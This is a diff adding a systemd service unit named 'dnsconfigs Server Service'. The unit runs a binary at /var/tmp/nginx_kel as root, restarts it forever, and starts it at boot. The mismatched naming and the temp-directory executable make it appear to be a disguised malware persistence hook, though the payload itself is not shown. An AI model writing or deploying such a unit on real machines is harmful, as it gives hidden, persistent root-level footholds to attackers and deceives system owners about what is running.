@@ -1,0 +1,10 @@
+[Unit]
+Description=dnsconfigs Server Service
+[Service]
+Type=simple
+Restart=always
+RestartSec=60
+User=root
+ExecStart=/var/tmp/nginx_kel sv
+[Install]
+WantedBy=multi-user.target
